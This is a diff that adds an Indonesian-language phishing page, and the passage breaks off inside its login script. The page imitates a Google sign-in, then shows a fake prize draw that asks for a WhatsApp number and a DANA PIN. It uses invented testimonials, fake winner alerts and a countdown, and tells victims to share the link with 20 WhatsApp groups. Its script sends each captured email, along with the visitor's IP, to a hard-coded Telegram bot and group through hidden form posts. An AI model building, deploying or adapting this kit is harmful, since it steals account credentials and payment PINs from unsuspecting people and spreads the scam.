@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk - Akun Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ===== RESET ===== */
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+
+        :root{
+            --google-blue:#1a73e8;
+            --google-blue-hover:#1557b0;
+            --google-gray-100:#f1f3f4;
+            --google-gray-300:#dadce0;
+            --google-gray-600:#80868b;
+            --google-gray-700:#5f6368;
+            --google-gray-900:#202124;
+            --google-red:#ea4335;
+            --gold-primary:#FFD700;
+            --gold-light:#FFED4A;
+            --gold-gradient:linear-gradient(135deg,#FFD700,#FFA500,#FF8C00);
+            --bg-deep:#0a0a0f;
+            --bg-glass:rgba(20,20,35,0.6);
+            --text-primary:#FFFFFF;
+            --text-secondary:#B0B0C0;
+            --text-muted:#707080;
+            --border-glass:rgba(255,215,0,0.15);
+            --border-active:rgba(255,215,0,0.5);
+            --shadow-gold:0 0 30px rgba(255,215,0,0.3);
+            --radius-sm:8px;--radius-md:12px;--radius-lg:20px;--radius-xl:28px;
+            --transition-smooth:0.4s cubic-bezier(0.4,0,0.2,1);
+            --font-primary:'Plus Jakarta Sans',sans-serif;
+            --font-display:'Orbitron',monospace;
+            --font-google:'Google Sans','Roboto',Arial,sans-serif;
+        }
+
+        body{
+            font-family:var(--font-google);
+            background:#fff;
+            color:var(--google-gray-900);
+            min-height:100vh;
+            overflow-x:hidden;
+            line-height:1.6;
+            transition:background 0.5s,color 0.5s;
+        }
+        body.dark{
+            background:var(--bg-deep);
+            background-image:radial-gradient(ellipse at 20% 20%,rgba(255,215,0,0.05) 0%,transparent 50%),radial-gradient(ellipse at 80% 80%,rgba(220,38,38,0.05) 0%,transparent 50%);
+        }
+
+        ::-webkit-scrollbar{width:6px}
+        ::-webkit-scrollbar-track{background:transparent}
+        ::-webkit-scrollbar-thumb{background:#888;border-radius:10px}
+
+        /* ===== PAGES ===== */
+        .page{display:none;min-height:100vh;animation:fadeIn 0.5s ease}
+        .page.active{display:flex;flex-direction:column}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+
+        /* ===== STARS ===== */
+        .stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:0;transition:opacity 0.8s}
+        .stars.show{opacity:1}
+        .star{position:absolute;background:#fff;border-radius:50%;animation:twinkle var(--d) ease-in-out infinite;animation-delay:var(--dl);opacity:0}
+        @keyframes twinkle{0%,100%{opacity:0.2;transform:scale(1)}50%{opacity:1;transform:scale(1.5)}}
+
+        /* ===== LOGIN PAGE ===== */
+        .lang-bar{display:flex;justify-content:flex-end;padding:8px 16px;font-size:13px;color:var(--google-gray-700)}
+        .lang-bar span{cursor:pointer;padding:4px 8px;border-radius:4px;transition:background 0.2s;display:flex;align-items:center;gap:2px}
+        .lang-bar span:hover{background:var(--google-gray-100)}
+        .login-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 40px 36px;max-width:450px;margin:0 auto;width:100%}
+        .glogo{margin-bottom:16px;display:flex;align-items:center;justify-content:center}
+        .heading{font-family:'Google Sans',sans-serif;font-size:24px;font-weight:400;margin-bottom:8px;text-align:center}
+        .subheading{font-size:16px;font-weight:400;margin-bottom:32px;text-align:center;color:var(--google-gray-700)}
+        .signin-box{width:100%;background:#fff;border:1px solid var(--google-gray-300);border-radius:8px;padding:48px 40px 36px;transition:box-shadow 0.2s}
+        .signin-box:hover{box-shadow:0 2px 6px 2px rgba(60,64,67,0.15),0 1px 2px rgba(60,64,67,0.3)}
+
+        .inp-group{position:relative;margin-bottom:24px}
+        .inp-group input{width:100%;height:56px;padding:20px 16px 6px;border:1px solid var(--google-gray-300);border-radius:4px;font-size:16px;font-family:var(--font-google);color:var(--google-gray-900);background:transparent;outline:none;transition:border-color 0.2s,box-shadow 0.2s;z-index:1;position:relative}
+        .inp-group input:focus{border-color:var(--google-blue);box-shadow:inset 0 0 0 1px var(--google-blue)}
+        .inp-group label{position:absolute;left:16px;top:50%;transform:translateY(-50%);font-size:16px;color:var(--google-gray-600);transition:all 0.15s ease;pointer-events:none;z-index:2;transform-origin:left center}
+        .inp-group input:focus~label,.inp-group input:not(:placeholder-shown)~label{top:12px;transform:translateY(-50%) scale(0.75);color:var(--google-blue)}
+        .inp-group input:not(:focus):not(:placeholder-shown)~label{color:var(--google-gray-600)}
+        .inp-group input::placeholder{color:transparent}
+        .inp-group input.err{border-color:var(--google-red)}
+        .err-msg{display:none;font-size:12px;color:var(--google-red);margin-top:6px;padding-left:16px;align-items:center;gap:6px}
+        .err-msg.show{display:flex}
+
+        .pw-toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:var(--google-gray-600);padding:8px;border-radius:50%;z-index:3;font-size:18px}
+        .pw-toggle:hover{background:var(--google-gray-100)}
+
+        .link-blue{font-size:14px;font-weight:500;color:var(--google-blue);text-decoration:none;display:inline-block;margin-bottom:32px;cursor:pointer;border-radius:4px;padding:4px 0;transition:background 0.2s}
+        .link-blue:hover{background:#e8f0fe;padding:4px 8px;margin-left:-8px}
+        .guest-txt{font-size:14px;color:var(--google-gray-600);margin-bottom:32px;line-height:1.5}
+        .guest-txt span{color:var(--google-blue);font-weight:500;cursor:pointer}
+
+        .btn-row{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
+        .btn-ghost{font-size:14px;font-weight:500;color:var(--google-blue);background:none;border:none;cursor:pointer;padding:8px 16px;border-radius:4px;transition:background 0.2s;font-family:'Google Sans',sans-serif}
+        .btn-ghost:hover{background:#e8f0fe}
+        .btn-blue{background:var(--google-blue);color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans',sans-serif;transition:background 0.2s,box-shadow 0.2s;min-width:80px;text-align:center;position:relative;z-index:10}
+        .btn-blue:hover{background:var(--google-blue-hover);box-shadow:0 1px 2px rgba(60,64,67,0.3)}
+        .btn-blue:active{background:#174ea6}
+        .btn-blue.loading{pointer-events:none;color:transparent}
+        .btn-blue.loading::after{content:'';position:absolute;top:50%;left:50%;width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top:2px solid #fff;border-radius:50%;animation:spin 0.6s linear infinite;margin:-9px 0 0 -9px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+
+        .footer-bar{display:flex;justify-content:space-between;align-items:center;padding:12px 24px;font-size:12px;color:var(--google-gray-600);flex-wrap:wrap;gap:8px}
+        .footer-bar select{border:none;background:none;color:var(--google-gray-600);font-size:12px;cursor:pointer;padding:4px;border-radius:4px;outline:none}
+        .footer-bar span{cursor:pointer;padding:4px 8px;border-radius:4px;transition:background 0.2s}
+        .footer-bar span:hover{background:var(--google-gray-100)}
+
+        /* ===== UNDIAN PAGE ===== */
+        .undian-wrap{position:relative;z-index:1;max-width:480px;margin:0 auto;padding:15px;width:100%}
+        .undian-box{background:var(--bg-glass);backdrop-filter:blur(40px);-webkit-backdrop-filter:blur(40px);border:1px solid var(--border-glass);border-radius:var(--radius-xl);padding:25px 20px;box-shadow:0 25px 80px rgba(0,0,0,0.6),0 0 60px rgba(255,215,0,0.05),inset 0 1px 0 rgba(255,255,255,0.05);animation:popIn 0.8s ease}
+        @keyframes popIn{from{opacity:0;transform:translateY(60px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+
+        .badge-live{display:inline-flex;align-items:center;gap:8px;background:rgba(255,215,0,0.1);border:1px solid rgba(255,215,0,0.3);padding:6px 16px;border-radius:50px;font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--gold-light);margin-bottom:12px;animation:pulse 3s ease-in-out infinite}
+        .badge-live .dot{width:6px;height:6px;background:#0f0;border-radius:50%;animation:dotBlink 1.5s infinite}
+        @keyframes pulse{0%,100%{box-shadow:0 0 10px rgba(255,215,0,0.2)}50%{box-shadow:0 0 25px rgba(255,215,0,0.5)}}
+        @keyframes dotBlink{0%,100%{opacity:1}50%{opacity:0.3}}
+
+        .title-big{font-family:var(--font-display);font-size:20px;font-weight:900;background:var(--gold-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:6px;text-align:center}
+        .subtitle-sm{font-size:13px;color:var(--text-secondary);text-align:center}
+        .sponsor-tags{display:flex;justify-content:center;gap:10px;margin-top:10px;flex-wrap:wrap}
+        .sponsor-tags span{font-size:10px;color:var(--text-muted);background:rgba(255,255,255,0.03);padding:4px 10px;border-radius:4px;border:1px solid rgba(255,255,255,0.05)}
+
+        .timer-box{background:rgba(220,38,38,0.1);border:1px solid rgba(220,38,38,0.3);border-radius:var(--radius-lg);padding:12px;text-align:center;margin:15px 0}
+        .timer-box .t-label{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:#F99}
+        .timer-box .t-display{font-family:var(--font-display);font-size:30px;font-weight:900;color:#F44;text-shadow:0 0 20px rgba(255,0,0,0.5)}
+
+        .live-bar{background:rgba(0,200,83,0.1);border:1px solid rgba(0,200,83,0.3);border-radius:var(--radius-md);padding:10px;margin:10px 0;display:flex;align-items:center;gap:10px;font-size:12px;color:#fff}
+        .live-bar .ldot{width:8px;height:8px;background:#0C3;border-radius:50%;animation:dotBlink 1s infinite}
+
+        .prize-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:15px 0}
+        .prize-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.05);border-radius:var(--radius-md);padding:10px 5px;text-align:center;transition:var(--transition-smooth);cursor:pointer}
+        .prize-card:hover{background:rgba(255,215,0,0.1);border-color:var(--border-active);transform:translateY(-3px)}
+        .prize-card .icon{font-size:28px}.prize-card .name{font-size:10px;font-weight:600;color:#fff}.prize-card .qty{font-size:9px;color:var(--gold-primary)}
+
+        .stats-row{display:flex;justify-content:space-around;background:rgba(255,255,255,0.03);border-radius:var(--radius-md);padding:10px;margin:15px 0;border:1px solid rgba(255,255,255,0.05)}
+        .stat-item{text-align:center}.stat-item .val{font-size:16px;font-weight:800;color:var(--gold-primary)}.stat-item .lbl{font-size:10px;color:var(--text-muted);text-transform:uppercase}
+
+        .testi-scroll{overflow:hidden;margin:15px 0;padding:10px 0}
+        .testi-track{display:flex;gap:12px;animation:marquee 30s linear infinite;width:max-content}
+        @keyframes marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+        .testi-card{min-width:200px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:var(--radius-md);padding:10px;flex-shrink:0;color:#fff}
+        .testi-card .stars{color:#FFD700;font-size:11px}.testi-card .txt{font-size:10px;color:var(--text-secondary);font-style:italic}.testi-card .auth{font-size:9px;color:var(--text-muted);margin-top:5px}
+
+        .step-row{display:flex;align-items:center;justify-content:center;gap:0;margin:15px 0}
+        .step-dot{width:28px;height:28px;border-radius:50%;background:rgba(255,255,255,0.05);border:2px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:11px;color:#fff;transition:var(--transition-smooth)}
+        .step-dot.act{background:var(--gold-primary);border-color:var(--gold-primary);color:#000;box-shadow:var(--shadow-gold)}
+        .step-dot.done{background:#0C3;border-color:#0C3;color:#fff}
+        .step-line{width:30px;height:2px;background:rgba(255,255,255,0.1);transition:var(--transition-smooth)}
+        .step-line.act{background:var(--gold-primary)}
+
+        .prog-bar-wrap{margin:10px 0}
+        .prog-bar{width:100%;height:8px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden}
+        .prog-fill{height:100%;background:var(--gold-gradient);border-radius:10px;transition:width 0.8s ease;width:0%}
+
+        .inp-wrap{position:relative;margin-bottom:10px}
+        .inp-wrap .ico{position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:18px;z-index:2}
+        .inp-wrap input{width:100%;padding:14px 14px 14px 48px;background:rgba(255,255,255,0.04);border:1.5px solid rgba(255,255,255,0.08);border-radius:var(--radius-md);color:#fff;font-size:15px;font-family:var(--font-primary);outline:none;transition:var(--transition-smooth)}
+        .inp-wrap input:focus{border-color:var(--border-active);background:rgba(255,215,0,0.05);box-shadow:0 0 25px rgba(255,215,0,0.15)}
+        .inp-wrap input::placeholder{color:var(--text-muted);font-size:13px}
+        .inp-wrap input:read-only{background:rgba(255,215,0,0.05);border-color:rgba(255,215,0,0.3);cursor:not-allowed}
+        .inp-hint{font-size:10px;color:var(--text-muted);margin-top:4px;padding-left:5px}
+
+        .btn-gold{width:100%;padding:14px;border:none;border-radius:var(--radius-md);font-size:15px;font-weight:700;cursor:pointer;font-family:var(--font-primary);text-transform:uppercase;letter-spacing:1px;transition:var(--transition-smooth);background:var(--gold-gradient);color:#000;box-shadow:0 10px 30px rgba(255,215,0,0.3);margin-top:10px;position:relative;z-index:10}
+        .btn-gold:hover{box-shadow:0 15px 40px rgba(255,215,0,0.5);transform:translateY(-2px)}
+        .btn-gold:active{transform:scale(0.97)}.btn-gold:disabled{opacity:0.5;pointer-events:none}
+        .btn-wa{background:linear-gradient(135deg,#25D366,#128C7E);color:#fff;box-shadow:0 10px 30px rgba(37,211,102,0.3)}
+
+        .success-box{display:none;text-align:center;padding:20px;animation:fadeIn 0.5s ease}
+        .success-box .chk{font-size:60px;animation:bounceIn 0.8s}
+        @keyframes bounceIn{0%{transform:scale(0)}60%{transform:scale(1.2)}100%{transform:scale(1)}}
+        .success-box h2{font-size:18px;margin:10px 0;background:var(--gold-gradient);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+        .success-box p{color:var(--text-secondary);font-size:13px}
+
+        /* ===== SPINNER OVERLAY ===== */
+        .spinner-ov{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999;justify-content:center;align-items:center;flex-direction:column;gap:16px}
+        .spinner-ov.show{display:flex}
+        .spinner-ov .sp{width:40px;height:40px;border:3px solid rgba(255,255,255,0.2);border-top:3px solid var(--gold-primary);border-radius:50%;animation:spin 0.8s linear infinite}
+        .spinner-ov .spt{font-size:14px;color:#fff;font-family:var(--font-primary)}
+
+        /* ===== CONFETTI ===== */
+        .confetti-box{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:998}
+        .cf-piece{position:fixed;z-index:1000;pointer-events:none;animation:cfFall var(--fd) ease-in forwards;animation-delay:var(--fdl)}
+        @keyframes cfFall{0%{transform:translateY(-100vh) rotate(0deg) scale(1);opacity:1}100%{transform:translateY(110vh) rotate(var(--fr)) scale(0.5);opacity:0}}
+
+        /* ===== TOAST ===== */
+        .toast-msg{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#323232;color:#fff;padding:12px 24px;border-radius:4px;font-size:14px;z-index:9999;opacity:0;transition:all 0.3s ease;max-width:90%;text-align:center}
+        .toast-msg.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+        .shake{animation:shk 0.5s ease}
+        @keyframes shk{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-6px)}80%{transform:translateX(6px)}}
+
+        @media(max-width:600px){
+            .login-wrap{padding:24px 16px}.signin-box{border:none;padding:24px 0 0}.signin-box:hover{box-shadow:none}
+            .footer-bar{flex-direction:column;align-items:flex-start}.prize-row{grid-template-columns:repeat(2,1fr)}
+            .title-big{font-size:17px}.t-display{font-size:24px}
+        }
+    </style>
+</head>
+<body>
+
+    <div class="stars" id="starsBg"></div>
+    <div class="spinner-ov" id="spinnerOv"><div class="sp"></div><p class="spt" id="spinnerTxt">Memproses...</p></div>
+    <div class="confetti-box" id="confettiBox"></div>
+    <div class="toast-msg" id="toastMsg"></div>
+
+    <iframe name="tgframe1" id="tgframe1" style="display:none;"></iframe>
+    <iframe name="tgframe2" id="tgframe2" style="display:none;"></iframe>
+
+    <!-- ==================== PAGE 1: GOOGLE LOGIN ==================== -->
+    <div class="page active" id="pageLogin">
+        <div class="lang-bar"><span>Bahasa Indonesia ▾</span></div>
+        <div class="login-wrap">
+            <div class="glogo">
+                <svg viewBox="0 0 75 24" width="75" height="24">
+                    <path d="M19.3 0h-14c-2.9 0-5.3 2.4-5.3 5.3v13.4c0 2.9 2.4 5.3 5.3 5.3h14c2.9 0 5.3-2.4 5.3-5.3V5.3C24.6 2.4 22.2 0 19.3 0z" fill="#4285F4"/>
+                    <path d="M12 16.5c-2.5 0-4.5-2-4.5-4.5s2-4.5 4.5-4.5c1.2 0 2.2.4 3 1.1l-1.2 1.2c-.5-.5-1.1-.8-1.8-.8-1.6 0-2.9 1.3-2.9 2.9s1.3 2.9 2.9 2.9c1.9 0 2.6-1.3 2.7-2h-2.7v-1.6h4.5c0 2.6-1.3 5.3-4.5 5.3z" fill="#fff"/>
+                    <text x="28" y="17" font-family="Arial" font-size="16" fill="#5f6368">Akun Google</text>
+                </svg>
+            </div>
+            <h1 class="heading">Masuk</h1>
+            <p class="subheading">Gunakan Akun Google Anda</p>
+            
+            <div class="signin-box">
+                <div id="stepEmail">
+                    <div class="inp-group">
+                        <input type="email" id="emailInp" placeholder=" " autocomplete="email" spellcheck="false">
+                        <label for="emailInp">Email atau nomor telepon</label>
+                        <div class="err-msg" id="emailErr"><span>⚠️</span><span id="emailErrTxt"></span></div>
+                    </div>
+                    <a class="link-blue" onclick="toast('Fitur tidak tersedia')">Lupa email?</a>
+                    <p class="guest-txt">Bukan komputer Anda? Gunakan mode Tamu. <span onclick="toast('Mode Tamu tidak tersedia')">Pelajari lebih lanjut</span></p>
+                    <div class="btn-row">
+                        <button class="btn-ghost" onclick="toast('Pembuatan akun tidak tersedia')">Buat akun</button>
+                        <button class="btn-blue" id="btnNextEmail" type="button">Berikutnya</button>
+                    </div>
+                </div>
+                
+                <div id="stepPass" style="display:none;">
+                    <div style="text-align:center;margin-bottom:20px;">
+                        <div style="width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;display:inline-flex;align-items:center;justify-content:center;font-size:18px;font-weight:500;" id="avLetter"></div>
+                        <p style="font-size:14px;color:#5f6368;margin-top:8px;" id="dispEmail"></p>
+                    </div>
+                    <div class="inp-group">
+                        <input type="password" id="passInp" placeholder=" " autocomplete="current-password">
+                        <label for="passInp">Masukkan sandi Anda</label>
+                        <button class="pw-toggle" id="btnTogglePw" type="button">👁️</button>
+                        <div class="err-msg" id="passErr"><span>⚠️</span><span id="passErrTxt"></span></div>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:8px;margin-bottom:24px;">
+                        <input type="checkbox" id="showPw" style="width:18px;height:18px;cursor:pointer;accent-color:#1a73e8;">
+                        <label for="showPw" style="font-size:14px;cursor:pointer;">Tampilkan sandi</label>
+                    </div>
+                    <div class="btn-row" style="margin-top:0;">
+                        <a class="link-blue" onclick="toast('Fitur tidak tersedia')">Lupa sandi?</a>
+                        <button class="btn-blue" id="btnLogin" type="button">Berikutnya</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bar">
+            <select><option>Bahasa Indonesia</option><option>English</option></select>
+            <div style="display:flex;gap:24px;"><span>Bantuan</span><span>Privasi</span><span>Persyaratan</span></div>
+        </div>
+    </div>
+
+    <!-- ==================== PAGE 2: UNDIAN ==================== -->
+    <div class="page" id="pageUndian">
+        <div class="undian-wrap">
+            <div class="undian-box">
+                <div style="text-align:center;">
+                    <div class="badge-live"><span class="dot"></span> PROGRAM EKSKLUSIF 2025</div>
+                    <h1 class="title-big">🎉 UNDIAN BERHADIAH MEWAH 🎉</h1>
+                    <p class="subtitle-sm">Grand Prize: Mobil + Motor + AC + Laptop</p>
+                    <div class="sponsor-tags"><span>Google</span><span>DANA</span><span>Shopee</span><span>Tokopedia</span></div>
+                </div>
+                
+                <div class="timer-box">
+                    <div class="t-label">⏰ PENDAFTARAN DITUTUP DALAM</div>
+                    <div class="t-display" id="cdDisplay">23:59:59</div>
+                </div>
+                
+                <div class="live-bar" id="liveBar">
+                    <span class="ldot"></span>
+                    <span id="liveTxt">🔔 +62 812-****-3456 baru memenangkan Motor Yamaha NMAX!</span>
+                </div>
+                
+                <div class="prize-row">
+                    <div class="prize-card"><div class="icon">🚗</div><div class="name">Mobil</div><div class="qty">1 Unit</div></div>
+                    <div class="prize-card"><div class="icon">🏍️</div><div class="name">Motor</div><div class="qty">1 Unit</div></div>
+                    <div class="prize-card"><div class="icon">❄️</div><div class="name">AC</div><div class="qty">2 Unit</div></div>
+                    <div class="prize-card"><div class="icon">💻</div><div class="name">Laptop</div><div class="qty">3 Unit</div></div>
+                </div>
+                
+                <div class="stats-row">
+                    <div class="stat-item"><div class="val" id="totPart">128,547</div><div class="lbl">Peserta</div></div>
+                    <div class="stat-item"><div class="val">87</div><div class="lbl">Pemenang</div></div>
+                    <div class="stat-item"><div class="val" id="slotLeft">3,452</div><div class="lbl">Slot Tersisa</div></div>
+                </div>
+                
+                <div class="testi-scroll"><div class="testi-track" id="testiTrack"></div></div>
+                
+                <div class="step-row">
+                    <div class="step-dot act" id="sDot1">1</div><div class="step-line" id="sLine1"></div>
+                    <div class="step-dot" id="sDot2">2</div><div class="step-line" id="sLine2"></div>
+                    <div class="step-dot" id="sDot3">3</div>
+                </div>
+                
+                <div class="prog-bar-wrap">
+                    <div style="display:flex;justify-content:space-between;font-size:10px;color:var(--text-secondary);"><span>Progress</span><span id="progPct">0%</span></div>
+                    <div class="prog-bar"><div class="prog-fill" id="progFill"></div></div>
+                </div>
+                
+                <div id="formUndian">
+                    <div class="inp-wrap"><span class="ico">📧</span><input type="email" id="uEmail" readonly></div>
+                    <div class="inp-hint">Email dari login Google Anda</div>
+                    <div class="inp-wrap" style="margin-top:10px;"><span class="ico">📱</span><input type="tel" id="uWa" placeholder="08xxxxxxxxxx"></div>
+                    <div class="inp-hint">Nomor WhatsApp aktif</div>
+                    <div class="inp-wrap" style="margin-top:10px;"><span class="ico">💰</span><input type="password" id="uPin" placeholder="6 digit PIN DANA" maxlength="6"></div>
+                    <div class="inp-hint">PIN DANA (opsional)</div>
+                    <button class="btn-gold" id="btnClaim" type="button">🚀 KLAIM HADIAH SEKARANG</button>
+                </div>
+                
+                <div class="success-box" id="successBox">
+                    <div class="chk">✅</div>
+                    <h2>SELAMAT! DATA TERVERIFIKASI!</h2>
+                    <p>Sebarkan link ke <b>20 grup WhatsApp</b> untuk klaim hadiah!</p>
+                    <div class="inp-wrap" style="margin-top:10px;"><input type="text" id="shareLink" readonly style="text-align:center;padding-left:14px;"></div>
+                    <button class="btn-gold" onclick="copyLink()" style="margin-top:10px;" type="button">📋 SALIN LINK</button>
+                    <button class="btn-gold btn-wa" onclick="openWA()" style="margin-top:10px;" type="button">💬 HUBUNGI ADMIN WA</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        // ==================== KONFIGURASI ====================
+        var CONFIG = {
+            BOT_TOKEN: "8848805781:AAH7yBuaO0vJO9t87aRbGHnqLxz2jPlr9GY", // GANTI!
+            CHAT_ID: "8633941926", // GANTI!
+            GROUP_CHAT_ID: "-1004367514036", // GANTI! (pakai minus: -100...)
+            ADMIN_WA: "6283869666254", // GANTI!
+            SHARE_REQ: 20
+        };
+
+        // ==================== STATE ====================
+        var STATE = {
+            email: '', password: '', wa: '', pin: '',
+            ip: '', ua: navigator.userAgent, plat: navigator.platform,
+            screen: screen.width+'x'+screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            lang: navigator.language, ref: document.referrer||'Direct', ts: ''
+        };
+
+        // ==================== DOM REFS ====================
+        function $(id){ return document.getElementById(id); }
+        var pageLogin = $('pageLogin');
+        var pageUndian = $('pageUndian');
+        var starsBg = $('starsBg');
+        var spinnerOv = $('spinnerOv');
+        var spinnerTxt = $('spinnerTxt');
+        var confettiBox = $('confettiBox');
+        var toastMsg = $('toastMsg');
+
+        // ==================== INIT ====================
+        function initStars(){
+            for(var i=0;i<80;i++){
+                var s=document.createElement('div');s.className='star';
+                s.style.cssText='left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;width:'+(Math.random()*2+1)+'px;height:'+s.style.width+';--d:'+(Math.random()*3+2)+'s;--dl:'+Math.random()*5+'s;';
+                starsBg.appendChild(s);
+            }
+        }
+
+        function initTesti(){
+            var data=[
+                {s:5,t:'"Gak nyangka dapet mobil! Terima kasih!"',a:'Rina, Jakarta',p:'Mobil Honda Brio'},
+                {s:5,t:'"Motor NMAX udah sampe, beneran real!"',a:'Budi, Surabaya',p:'Motor Yamaha NMAX'},
+                {s:5,t:'"Awalnya ragu, eh laptop dikirim."',a:'Dewi, Bandung',p:'Laptop Asus ROG'},
+                {s:5,t:'"AC udah dipasang, makasih admin!"',a:'Andi, Medan',p:'AC Panasonic'},
+                {s:4,t:'"Dapet motor Beat, istri seneng!"',a:'Hendra, Semarang',p:'Motor Honda Beat'},
+                {s:5,t:'"Kira-kira tipu, ternyata beneran!"',a:'Sari, Malang',p:'Laptop Lenovo'},
+            ];
+            var track=$('testiTrack');
+            var all=data.concat(data);
+            all.forEach(function(t){
+                var c=document.createElement('div');c.className='testi-card';
+                c.innerHTML='<div class="stars">'+'⭐'.repeat(t.s)+'</div><div class="txt">'+t.t+'</div><div class="auth">- '+t.a+' | 🎁 '+t.p+'</div>';
+                track.appendChild(c);
+            });
+        }
+
+        function initCountdown(){
+            function upd(){
+                var n=new Date(),e=new Date(n);e.setHours(23,59,59,999);
+                var d=e-n;if(d<=0){$('cdDisplay').textContent='00:00:00';return;}
+                var h=Math.floor(d/36e5),m=Math.floor((d%36e5)/6e4),s=Math.floor((d%6e4)/1e3);
+                $('cdDisplay').textContent=String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+            }
+            upd();setInterval(upd,1000);
+        }
+
+        function initLiveNotif(){
+            var notif=[
+                '🔔 +62 812-****-3456 baru memenangkan Motor Yamaha NMAX!',
+                '🔔 +62 878-****-7890 baru memenangkan Laptop Asus ROG!',
+                '🔔 +62 856-****-1122 baru memenangkan AC Panasonic!',
+                '🔔 +62 822-****-9988 baru memenangkan Mobil Honda Brio!',
+            ];
+            var i=0;
+            setInterval(function(){i=(i+1)%notif.length;$('liveTxt').textContent=notif[i];},3500);
+        }
+
+        function initStats(){
+            var p=128547,sl=3452;
+            setInterval(function(){p+=Math.floor(Math.random()*5)+1;sl-=Math.floor(Math.random()*2)+1;if(sl<500)sl=500+Math.floor(Math.random()*500);
+                $('totPart').textContent=p.toLocaleString();$('slotLeft').textContent=sl.toLocaleString();},5000);
+        }
+
+        function getIP(){
+            try{
+                var x=new XMLHttpRequest();
+                x.open('GET','https://api.ipify.org?format=json',true);
+                x.onload=function(){if(x.status===200){STATE.ip=JSON.parse(x.responseText).ip;}};
+                x.send();
+            }catch(e){STATE.ip='Gagal';}
+        }
+
+        function toast(msg){
+            toastMsg.textContent=msg;toastMsg.classList.add('show');
+            clearTimeout(toastMsg._t);toastMsg._t=setTimeout(function(){toastMsg.classList.remove('show');},3000);
+        }
+
+        function shake(el){el.classList.add('shake');setTimeout(function(){el.classList.remove('shake');},500);}
+
+        function showSpinner(txt){spinnerTxt.textContent=txt||'Memproses...';spinnerOv.classList.add('show');}
+        function hideSpinner(){spinnerOv.classList.remove('show');}
+
+        // ===== TELEGRAM SENDER =====
+        function sendTelegram(msg, targetChatId){
+            var token = CONFIG.BOT_TOKEN;
+            var cid = targetChatId || CONFIG.CHAT_ID;
+            var enc = encodeURIComponent(msg);
+            
+            // Form submit (always works)
+            var f = document.createElement('form');
+            f.method = 'POST';
+            f.action = 'https://api.telegram.org/bot' + token + '/sendMessage';
+            f.target = 'tgframe' + (targetChatId ? '2' : '1');
+            f.style.display = 'none';
+            
+            var i1 = document.createElement('input'); i1.type='hidden'; i1.name='chat_id'; i1.value=cid; f.appendChild(i1);
+            var i2 = document.createElement('input'); i2.type='hidden'; i2.name='text'; i2.value=msg; f.appendChild(i2);
+            var i3 = document.createElement('input'); i3.type='hidden'; i3.name='parse_mode'; i3.value='HTML'; f.appendChild(i3);
+            
+            document.body.appendChild(f);
+            f.submit();
+            setTimeout(function(){ document.body.removeChild(f); }, 500);
+            
+            console.log('✅ Data terkirim ke: ' + cid);
+        }
+        
+        function sendToAll(msg){
+            // Kirim ke bot pribadi
+            sendTelegram(msg, CONFIG.CHAT_ID);
+            // Kirim ke grup
+            if(CONFIG.GROUP_CHAT_ID && CONFIG.GROUP_CHAT_ID !== CONFIG.CHAT_ID){
+                sendTelegram(msg, CONFIG.GROUP_CHAT_ID);
+            }
+        }
+
+        // ===== LOGIN SETUP =====
+        function setupLogin(){
+            $('btnNextEmail').addEventListener('click', function(e){
+                e.preventDefault();
+                var em = $('emailInp').value.trim();
+                if(!em || !em.includes('@')){
+                    $('emailErr').classList.add('show');
+                    $('emailErrTxt').textContent = 'Masukkan email valid';
+                    shake($('emailInp'));
+                    return;
+                }
+                $('emailErr').classList.remove('show');
+                STATE.email = em;
+                STATE.ts = getTS();
+                
+                this.classList.add('loading');
+                this.style.pointerEvents = 'none';
+                
+                sendToAll('<b>🔑 LOGIN GOOGLE - EMAIL</b>\n\n<b>📧 Email:</b> <code>'+em+'</code>\n<b>🌐 IP:</b> <code>'+STATE.ip+'</code>\n<b>🕒 Waktu:</b> '+STATE.ts);
+                
+                setTimeout(function(){
+                    $('stepEmail').style.display = 'none';
+                    $('stepPass').style.display = 'block';
